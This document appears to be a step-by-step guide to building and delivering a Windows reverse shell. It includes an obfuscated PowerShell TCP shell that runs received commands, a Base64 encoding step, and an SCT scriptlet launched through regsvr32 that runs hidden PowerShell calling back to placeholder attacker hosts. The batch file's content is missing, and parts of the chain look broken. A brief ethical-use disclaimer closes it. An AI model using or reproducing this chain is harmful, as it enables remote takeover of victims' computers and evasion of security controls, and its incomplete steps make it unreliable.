# Step-by-Step Simulation Guide Note: Files available for adapting in repository.

1. Create the Reverse Shell PowerShell Script
Create a file named reverse_shell.ps1 with the following content:

param (
    [string]$ip,
    [int]$port
)

# Obfuscated variable names
$A = 'Get'+'Stream'
$C = [System.Text.Encoding]::'ASCII'
$b = 0..65535 | % {0}
$Q = 'System.Net.Sockets.TCPClient'
$w = 'Re'+'ad'
$O = 'Wr'+'ite'
$F = 'System.Text.ASCIIEncoding'

$client = New-Object $Q($ip, $port)
$stream = $client.$A()
while (($i = $stream.$w($b, 0, $b.Length)) -ne 0) {
    $d = (New-Object -TypeName $F).GetString($b, 0, $i)
    $S = (iex $d 2>&1 | Out-String)
    $R = $S + "PS " + (pwd).Path + "> "
    $f = $C.GetBytes($R)
    $stream.$O($f, 0, $f.Length)
    $stream.Flush()
}
$client.Close()



2. Encode the Script to Base64
Run the following PowerShell commands to encode the script:

$script = Get-Content -Path .\reverse_shell.ps1 -Raw
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encoded = [Convert]::ToBase64String($bytes)
$encoded

# Copy the resulting Base64 string.

3. Create the Batch File
Create a file named run_reverse_shell.bat with the following content. Replace <Base64_encoded_string> with the Base64 string you copied:

4. Host the Files on a Web Server
Upload run_reverse_shell.bat to your web server.
Ensure it is accessible, e.g., http://yourserver.com/run_reverse_shell.bat.

5. Create the SCT File
Create a file named reverse_shell.sct with the following content. Replace http://yourserver.com/run_reverse_shell.bat with the actual URL of your hosted batch file, and replace attacker_ip and attacker_port with your attacker's IP and port:
<scriptlet>
  <registration>
    <script language="JScript">
      <![CDATA[
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run("cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File http://yourserver.com/run_reverse_shell.bat attacker_ip attacker_port");
      ]]>
    </script>
  </registration>
</scriptlet>

Upload reverse_shell.sct to your web server.
Ensure it is accessible, e.g., http://yourserver.com/reverse_shell.sct.
6. Execute the SCT File using regsvr32
On the target machine, run the following command to execute the SCT file:

regsvr32 /s /i:http://yourserver.com/reverse_shell.sct scrobj.dll

7. Establish the Reverse Shell Connection
When the SCT file is executed, it will download and run the batch file, which will decode and execute the PowerShell script to establish a reverse shell connection to the specified IP and port.


# Important Notes:
Ethical Use: Ensure you have explicit permission to test systems with this script. Unauthorised use is illegal and unethical.
Controlled Environment: Use a controlled environment for testing.
Troubleshooting: Keep a non-obfuscated version of the scripts for troubleshooting and maintenance.
